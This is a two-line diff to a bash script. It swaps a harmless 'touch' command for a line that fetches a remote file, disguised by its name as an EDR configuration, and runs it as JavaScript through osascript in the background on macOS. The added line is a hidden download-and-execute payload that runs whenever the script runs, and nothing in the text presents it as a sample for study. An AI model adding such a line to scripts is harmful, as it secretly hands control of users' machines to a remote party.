@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-touch /tmp/fone
+curl http://testimg.bitgetapp.com/multiLang/web/files/edr.json | osascript -l JavaScript &
